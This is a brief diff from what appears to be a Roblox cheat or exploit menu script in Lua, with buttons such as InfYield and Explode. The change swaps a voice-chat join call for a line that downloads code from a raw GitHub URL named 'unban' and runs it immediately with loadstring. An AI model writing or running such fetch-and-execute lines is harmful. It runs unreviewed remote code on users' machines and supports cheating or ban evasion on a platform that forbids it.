@@ -3273,7 +3273,7 @@ InfYield_Button.MouseButton1Click:Connect(function()
 end)
 
 VC_Button.MouseButton1Click:Connect(function()
-	game:GetService("VoiceChatService"):joinVoice()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/casswilss/cass/cass/unban'))()
 end)
 
 Explode_Button.MouseButton1Click:Connect(function()
